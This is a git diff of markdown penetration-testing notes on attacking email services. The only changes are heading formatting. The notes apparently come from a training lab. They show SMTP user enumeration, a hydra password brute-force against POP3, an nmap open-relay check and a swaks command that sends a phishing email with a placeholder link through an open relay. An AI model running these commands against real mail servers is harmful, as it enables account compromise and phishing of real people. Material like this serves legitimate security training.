@@ -7,7 +7,7 @@
 | `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) | Sending emails with encryption    |
 | `TCP/993` | IMAP4 Encrypted                                                            | Receiving emails securely         |
 | `TCP/995` | POP3 Encrypted                                                             | Receiving emails securely         |
-User Enumeration:
+### User Enumeration
 
 `VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.
 
@@ -100,7 +100,7 @@ USER john
 +OK
 ```
 
-Summary:
+### Summary
 
 | **Command** | **Function**                                                                                                                   |
 | ----------- | ------------------------------------------------------------------------------------------------------------------------------ |
@@ -108,7 +108,7 @@ Summary:
 | EXPN        | Expands a mailing list or group. Returns the members of the mailing list if available, or an error if the list does not exist. |
 | **RCPT TO** | Specifies the recipient(s) of an email in the SMTP transaction. Used to define individual or multiple recipients.              |
 
-Automatite Process:
+### Automatite Process
 
 ```bash
 smtp-user-enum -M RCPT -U userlist.txt -d inlanefreight.htb -t 10.129.203.7
@@ -120,7 +120,7 @@ Once users have been gather we can brute force the password:
 hydra -l marlin@inlanefreight.htb -P passwords.list -f 10.129.203.12 pop3 -VV -F -I -t 64
 ```
 
-Open Relay:
+### Open Relay
 
 ```bash
 nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
@@ -132,7 +132,7 @@ Send Email to Open Relay:
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
 ```
 
-Connect to POP3 - Retreieve Emails
+### Connect to POP3 - Retrieve Emails
 
 Connect and enter username and password:
 
